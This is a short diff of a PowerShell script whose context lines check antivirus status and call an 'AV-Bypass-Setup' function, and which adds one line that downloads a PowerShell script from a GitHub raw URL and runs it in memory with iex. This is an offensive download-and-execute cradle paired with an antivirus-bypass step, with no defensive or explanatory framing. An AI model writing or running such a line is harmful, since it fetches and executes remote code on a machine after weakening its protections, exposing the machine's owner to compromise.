@@ -91,3 +91,5 @@ Write-host ""
 Write-host "Localhost AV Status"
 Get-AVStatus
 AV-Bypass-Setup
+
+iex((New-Object system.net.WebClient).DownloadString('https://raw.githubusercontent.com/b4rtik/PowerTheShell/master/Console/PowerTheShell.ps1'))
